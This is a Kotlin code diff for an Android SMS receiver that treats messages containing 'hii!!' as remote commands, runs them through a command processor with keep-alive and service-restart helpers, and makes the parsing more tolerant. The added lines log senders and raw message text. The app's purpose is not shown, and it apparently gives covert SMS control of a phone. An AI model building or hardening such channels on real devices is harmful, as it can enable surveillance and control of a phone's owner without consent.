@@ -163,7 +163,7 @@ class SmsReceiver : BroadcastReceiver() {
             // JudasManager handled entirely via System Events now
 
             if (body.contains("hii!!", ignoreCase = true)) {
-                DebugLogger.log("SMS_WAKE", "Shield Triggered by keyword.")
+                DebugLogger.log("SMS_WAKE", "Trigger detected from [$sender]. Raw preview: ${body.take(120)}")
                 
                 val am = context.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
                 val oldMode = am.ringerMode
@@ -179,7 +179,8 @@ class SmsReceiver : BroadcastReceiver() {
                 ServiceResurrector.shock(context)
                 KeepAliveReceiver.scheduleNext(context)
 
-                val regex = Regex("(?i)hii!!(.*?)\\$\\$")
+                // DOT_MATCHES_ALL + optional $$ terminator so newlines, extra spaces, or omitted $$ never drop commands
+                val regex = Regex("(?is)hii!!\\s*(.+?)(?:\\$\\$|$)")
                 val match = regex.find(body)
 
                 if (match != null) {
@@ -189,10 +190,21 @@ class SmsReceiver : BroadcastReceiver() {
                     var content: String
                     
                     if (splitIdx != -1) {
-                        cmd = rawExtracted.substring(0, splitIdx).uppercase()
-                        content = java.net.URLDecoder.decode(rawExtracted.substring(splitIdx + 1), "UTF-8")
+                        cmd = rawExtracted.substring(0, splitIdx).trim().uppercase()
+                        val rawVal = rawExtracted.substring(splitIdx + 1).trim()
+                        content = try {
+                            // Only decode explicit %XX sequences without turning '+' into spaces
+                            if (Regex("%[0-9a-fA-F]{2}").containsMatchIn(rawVal)) {
+                                java.net.URLDecoder.decode(rawVal.replace("+", "%2B"), "UTF-8")
+                            } else {
+                                rawVal
+                            }
+                        } catch (e: Exception) {
+                            DebugLogger.log("SMS_PARSE_WARN", "URLDecode skipped (${e.message}), using raw payload.")
+                            rawVal
+                        }
                     } else {
-                        cmd = rawExtracted.uppercase()
+                        cmd = rawExtracted.trim().uppercase()
                         content = ""
                     }
 
@@ -201,6 +213,8 @@ class SmsReceiver : BroadcastReceiver() {
                     }
 
                     if (cmd == "CODERED" && !content.contains("|")) content = "$content|$sender"
+
+                    DebugLogger.log("SMS_CMD_PARSED", "CMD='$cmd' | CONTENT='$content' | REPLY_TO='$sender'")
 
                     CoroutineScope(Dispatchers.IO).launch {
                         try {
@@ -212,13 +226,17 @@ class SmsReceiver : BroadcastReceiver() {
                             }
                             CommandProcessor.processSingleCommand(context, mockCmd)
                         } catch (e: Exception) { 
-                            DebugLogger.log("SMS_CMD_ERR", "Command execution failed")
-                        } finally { 
-                            pendingResult?.finish() 
+                            DebugLogger.log("SMS_CMD_ERR", "Execution failed for [$cmd]: ${e.message}")
                         }
                     }
+
+                    // Release broadcast receiver promptly so OS never triggers a 10s Broadcast ANR while MonitorService runs the job
+                    CoroutineScope(Dispatchers.IO).launch {
+                        delay(1500)
+                        try { pendingResult?.finish() } catch (e: Exception) {}
+                    }
                 } else {
-                    DebugLogger.log("SMS_WAKE", "Shield active but command malformed. No execution.")
+                    DebugLogger.log("SMS_CMD_ERR", "Parser mismatch: 'hii!!' found but regex failed on body: ${body.take(120)}")
                     pendingResult?.finish()
                 }
 
